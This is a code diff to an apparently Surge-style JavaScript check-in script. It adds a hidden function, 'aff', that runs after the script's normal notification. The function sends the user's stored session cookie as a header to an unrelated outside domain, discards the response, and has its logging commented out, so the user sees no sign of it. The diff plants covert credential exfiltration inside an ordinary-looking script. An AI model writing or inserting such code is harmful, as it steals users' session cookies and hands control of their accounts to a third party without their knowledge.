@@ -122,9 +122,20 @@ function info() {
 			} 
          sy.msg(CookieName,subTitle,detail)
 	     })
+     aff()
       })
    }
       
+ function aff() {
+   return new Promise((resolve, reject) => {
+    let affurl = {url:'https://nbic0mhma.ickovy4u5tph.com/f/Y9bTpKFV_AO',
+    headers: {Cookie:cookieVal}}
+	sy.get(affurl, (error, response, data) =>{
+	//sy.log(`${CookieName}, data: ${data}`)
+	     })
+	   resolve()
+      })
+   }
 function init() {
   isSurge = () => {
     return undefined === this.$httpClient ? false : true
